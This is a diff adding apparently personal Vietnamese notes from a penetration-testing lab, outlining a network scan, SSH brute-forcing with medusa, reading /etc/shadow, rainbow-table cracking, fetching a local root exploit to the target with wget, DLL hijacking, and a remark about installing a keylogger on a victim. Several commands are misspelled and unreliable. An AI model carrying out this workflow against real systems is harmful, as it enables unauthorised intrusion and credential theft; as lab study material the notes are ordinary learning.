@@ -1,0 +1,84 @@
+ifconfig
+nmap -sP 192.168.1.100-200
+192.168.1.152
+nmap -vv -p- 192.168.1.151
+nmap -vv -p- -A 192.168.1.151
+medusa -h
+hydra -h 
+Tim pass giai mat thu
+tim duoc file - Tai ve -> Giai ma -> Dung bo dien tu sinh de crack
+medusa -h 192.168.1.151 -n 1322 -U
+metasploit -> data -> ...
+ls /usr/share/metasploit-framwork/data/worlistd
+
+http default user
+http ..pass
+
+medusa -h 192.168.1.151 -n 1322 -U /usr/share/metasploit-framwork/data/worlist/http...txt - P ... /pass.text
+ssh -p 1322 admin@192.168.1.151 
+admin - quyen user - khong phai quyen root - nhung co the xam nhap dc roi
+online tools to search password default
+tronjan - keylogger - Cai vo may nan nhan - Roi Cho nan nhan nhap vao roi lay
+vo github -keylogger - day
+hash injection/ pass - the -hash
+passive online attacks: Man in the middle and Replay Attacks
+
+Rainbow Table Attack.
+
+plaintext ---> hash value
+sudo apt-get install rainbowlcrack
+cat /etc/shadow
+window: pwdump7
+rtgen -h
+rtgen- Generate rainbow tables
+rtgen md5 loweralpha 1 7 0 1000*1000_0.rt
+ls /usr/share/rainbowcrack/
+rsort 
+rcrack
+Pwdump7
+Mimi
+L0phtCrack
+ophcarck
+John the Ripper
+crypto hash
+salt : pass(plaintext + random str --> hash --> )
+pepper: pass + (--> hash ---> )
+leo thang dac quyen
+uname -a
+dung ubun 14.04.1
+exploit database
+tool searchsploit
+escalation : leo thang dac quyen
+cp /usr/share/expolits/linux/local/39166.c  /var/www/html/
+ls /var/www/html
+
+systemctl status apache2.service
+
+systemctl start apache2.service
+
+wget 192.168.1.152/39166.c
+
+tu user binh thuong --> quyen root
+
+horizontal privilege escalation
+
+vertical privilege escalation
+
+
+foxit reader .exe ---> load thu vien fuction --> dll. Trong dll chua function
+
+needed dll 
+-> malicious dll
+
+dll hijacking
+
+nvcudar.dll
+
+python -m SimpleHttpServer 80
+
+
+
+
+
+
+
